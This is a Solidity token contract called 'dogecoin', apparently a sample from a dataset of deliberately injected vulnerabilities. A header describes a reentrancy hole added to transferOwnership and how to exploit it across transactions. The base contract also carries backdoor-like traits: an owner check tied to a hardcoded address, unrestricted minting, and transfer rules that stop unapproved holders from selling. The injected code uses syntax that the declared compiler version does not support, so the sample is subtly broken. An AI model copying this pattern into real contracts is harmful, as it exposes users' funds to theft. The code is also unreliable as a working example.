/*
 * ===== SmartInject Injection Details =====
 * Function      : transferOwnership
 * Vulnerability : Reentrancy
 * Status        : Not Detected
 * Type          : Function Modification
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 0 issues
 * Retry Count   : 0
 *
 * === Description ===
 * Introduced a stateful, multi-transaction reentrancy vulnerability by:
 * 
 * 1. **Added State Variable**: `pendingOwnershipTransfers` mapping to track pending ownership transfers across transactions
 * 2. **External Call Before State Update**: Added external call to `newOwner.call()` before finalizing the ownership transfer
 * 3. **State-Dependent Logic**: The ownership transfer only completes if `pendingOwnershipTransfers[newOwner]` is still true after the external call
 * 
 * **Multi-Transaction Exploitation Scenario:**
 * 
 * **Transaction 1 (Setup)**: Attacker deploys a malicious contract that will become the new owner
 * **Transaction 2 (Initial Call)**: Current owner calls `transferOwnership(maliciousContract)`
 * **During Transaction 2**: The malicious contract's `onOwnershipTransfer` function is called via reentrancy, which can:
 * - Call other contract functions while `owner` is still the original owner
 * - Manipulate contract state (mint tokens, transfer funds, etc.)
 * - Set `pendingOwnershipTransfers[maliciousContract] = false` to prevent ownership transfer completion
 * - Or allow the transfer to complete after extracting value
 * 
 * **Why Multi-Transaction is Required:**
 * - The vulnerability requires the attacker to first deploy a malicious contract (Transaction 1)
 * - The actual exploitation happens during the ownership transfer call (Transaction 2)
 * - The attacker can manipulate the `pendingOwnershipTransfers` state during reentrancy to control whether the ownership transfer completes
 * - The persistent state in `pendingOwnershipTransfers` allows the attacker to influence the final outcome across the call stack
 * 
 * This creates a realistic scenario where the ownership transfer mechanism has been "enhanced" with notifications, but the external call creates a reentrancy window that can be exploited across multiple transactions.
 */
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract dogecoin is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
  }
  
  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == address(1080614020421183795110940285280029773222128095634));_;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
  mapping(address => bool) public pendingOwnershipTransfers;
  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    
    // Mark this ownership transfer as pending
    pendingOwnershipTransfers[newOwner] = true;
    
    // Notify the new owner through external call before finalizing transfer
    if (extcodesize(newOwner) > 0) {
      (bool success, ) = newOwner.call(abi.encodeWithSignature("onOwnershipTransfer(address)", owner));
      require(success, "Ownership notification failed");
    }
    
    // Only finalize ownership if still pending (can be manipulated during reentrancy)
    if (pendingOwnershipTransfers[newOwner]) {
      emit OwnershipTransferred(owner, newOwner);
      owner = newOwner;
      pendingOwnershipTransfers[newOwner] = false;
    }
// ===== SMARTINJECT: Reentrancy VULNERABILITY END =====
  }

  function extcodesize(address _addr) internal view returns (uint256 size) {
    assembly { size := extcodesize(_addr) }
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
  
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}
